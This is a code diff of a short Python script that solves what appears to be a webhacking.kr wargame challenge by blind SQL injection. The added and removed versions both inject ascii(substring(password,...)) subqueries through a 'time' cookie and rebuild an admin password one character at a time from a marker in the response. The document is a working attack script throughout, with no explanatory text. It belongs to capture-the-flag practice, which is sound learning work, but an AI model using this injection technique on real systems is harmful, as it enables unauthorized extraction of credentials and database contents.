@@ -1,30 +1,18 @@
-from http import client
+import urllib.request
 
-conn = client.HTTPConnection('webhacking.kr', 80)
+password = ""
 
-base = "/challenge/web/web-02/index.php"
+for i in range(1, 9):
+    for j in range(30,172):
+        url = "http://webhacking.kr/challenge/web/web-02/"
+        re = urllib.request.Request(url)
 
-tryList = []
-awsList = []
-
-for i in range(48, 126):
-    tryList.append(i)
-
-for i in range(1, 13):
-    for w in tryList:
-        print(str(w))
-        headers = {
-            'Cookie': 'time=1515313346 and (select ascii(substring(password,' + str(i) + ',1)) from FreeB0aRd = ' + str(
-                w) + '; PHPSESSID=b42c70b37b426e713f255de859633556'}
-        conn.request('GET', base, '', headers)
-        res = conn.getresponse()
-        resData = res.read()
-        strRes = str(resData)
-        if (strRes.find('<!--2070-01-01 09:00:00-->') != -1):
-            awsList.append(str(w))
+        re.add_header('Cookie', 'time=1515414399 and (select ascii(substring(password,{},1)) from admin)={}; PHPSHESSID=b42c70b37b426e713f255de859633556'.format(i,j))
+        
+        res = urllib.request.urlopen(re).read()
+        if str(res).find("09:00:01") != -1:
+            password += chr(j)
+            print("Found it!! => " + password)
             break
-
-for i in awsList:
-    print(chr(int(i)), end="")
-
-conn.close()
+print("Finished Searching.")
+print("Password : " + password)
